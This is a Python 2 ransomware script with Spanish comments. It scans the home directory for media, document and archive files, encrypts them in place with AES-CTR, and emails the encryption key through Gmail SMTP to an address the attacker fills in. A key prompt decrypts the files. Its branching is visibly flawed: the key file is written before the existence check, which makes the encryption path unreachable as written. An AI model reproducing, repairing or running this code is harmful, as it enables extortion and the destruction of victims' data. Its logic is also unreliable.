#!/usr/bin/env python
#_*_ codign: utf8 _*_

import os
import socket
import random
import hashlib
from Crypto.Util import Counter
from Crypto.Cipher import AES
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


	# listar el contenido del directorio HOME
home = os.environ['HOME']
carpetas = os.listdir(home)
	# Eliminar las carpetas que empiecen con .
carpetas = [x for x in carpetas if not x.startswith('.')]

extensiones = ['.mp3','.wav','.m4a','.mp4','.avi','.jpg','jpeg','.zip','.rar','.dat','pdf','.txt']

def check_internet():
		# crear el socket (conector)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		# tiempo maximo de espera
	s.settimeout(2)

		# verificar la conexion a internet
	try:
		s.connect(('socket.io',80))
		# print('Conectado')
		s.close()
	except:
		exit()

	# enviar la clave por email
def enviar_datos():
	msg = MIMEMultipart()
	password = '' # CONTRASEÑA DEL EMAIL AL QUE SE ENVIARA LA CLAVE
	msg['From'] = '' # EMAIL AL QUE SE ENVIARA
	msg['To'] = '' # AQUI PONEMOS EL MISMO EMAIL PARA ENVIARNOSLO A NOSOTROS MISMOS
	msg['Subject'] = 'Llave simetrica'

	msg.attach(MIMEText(file('key_file').read()))

		# conectamos con el servidor de correo (gmail)
	try:
		server = smtplib.SMTP('smtp.gmail.com:587')
		server.starttls()
		server.login(msg['From'], password)
		server.sendmail(msg['From'], msg['To'], msg.as_string())
		server.quit()
	except:
		pass


# Creacion de llave simetrica
def get_hash():
		# obtener una cadena de texto aleatoria
	hashcomputer = os.environ['HOME'] + os.environ['USER'] + socket.gethostname() + str(random.randint(0,10000000000000000000000000))
		# convetir la cadena de texto en un hash (sha512 .. 128 caracteres)
	hashcomputer = hashlib.sha512(hashcomputer)
		# hash en texto plano
	hashcomputer = hashcomputer.hexdigest()

		# recortar el hash a una longitud de 32 caracteres
	new_key = []

	for k in hashcomputer:
		if len(new_key) == 32:
			hashcomputer = ''.join(new_key) # .join convierte una lista en una cadena de texto
		else:
			new_key.append(k)

	return hashcomputer


# Encriptar y desencriptar
def encrypt_and_decrypt(archivo, crypto, block_size=16):
		# abrimos el acrchivo en modo binario
	with open(archivo, 'r+b') as archivo_enc:
			# dividimos todo el archivo en bloques de 16 bits
		contenido_sincifrar = archivo_enc.read(block_size)
			# recorremos bloque por bloque
		while contenido_sincifrar:
			contenido_cifrado = crypto(contenido_sincifrar)

			if len(contenido_sincifrar) != len(contenido_cifrado):
				raise ValueError('')

				# nos movemos por el archivo bloque a bloque (seek) para ir cifrandolos
			archivo_enc.seek(- len(contenido_sincifrar), 1)
			archivo_enc.write(contenido_cifrado)
			contenido_sincifrar = archivo_enc.read(block_size)


# Recorrer las carpetas en busca de archivos
def discover(key):
	lista_archivos = open('lista_archivos', 'w+')

	for carpeta in carpetas:
			# creamos ruta absoluta
		ruta = home+'/'+carpeta

		for extension in extensiones:
			for rutabs, directorio, archivo in os.walk(ruta): # con os.walk construimos un arbol de directorios para explorar cada uno de los archivos
				for file in archivo:
					if file.endswith(extension):
						lista_archivos.write(os.path.join(rutabs, file)+'\n')
	lista_archivos.close()

		# abrimos y listamos el contenido del archivo 
	lista = open('lista_archivos', 'r')
	lista = lista.read().split('\n')
		# eliminamos el elemento nulo (vacio) del archivo
	lista = [l for l in lista if not l == '']

	key_file = open('key_file', 'w+')
	key_file.write(key)
	key_file.close()

		# verificamos si existe la clave simetrica
	if os.path.exists('key_file'):
			# pedimos la clave para desencriptar
		key1 = raw_input('Key: ')
		key_file = open('key_file', 'r')
		key = key_file.read().split('\n') # borramos saltos de linea
		key = ''.join(key) # .join convierte una lista en una cadena de texto

			# comprobamos que la contraseña sea correcta
		if key1 == key:
			c = Counter.new(128)
			crypto = AES.new(key, AES.MODE_CTR, counter=c)
			cryptarchives = crypto.decrypt

				# desecriptamos los archivos
			for element in lista:
				encrypt_and_decrypt(element, cryptarchives)

	else:
		c = Counter.new(128)
			# encriptamos
		crypto = AES.new(key, AES.MODE_CTR, counter=c)
		key_file = open('key_file', 'w+')
		key_file.write(key)
		key_file.close()
		enviar_datos()
		cryptarchives = crypto.encrypt

			# recorrer cada elemento de la lista para encriptar los archivos
		for element in lista:
			encrypt_and_decrypt(element,cryptarchives)



def main():
	check_internet()
	hashcomputer = get_hash()
	discover(hashcomputer)

if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		exit()




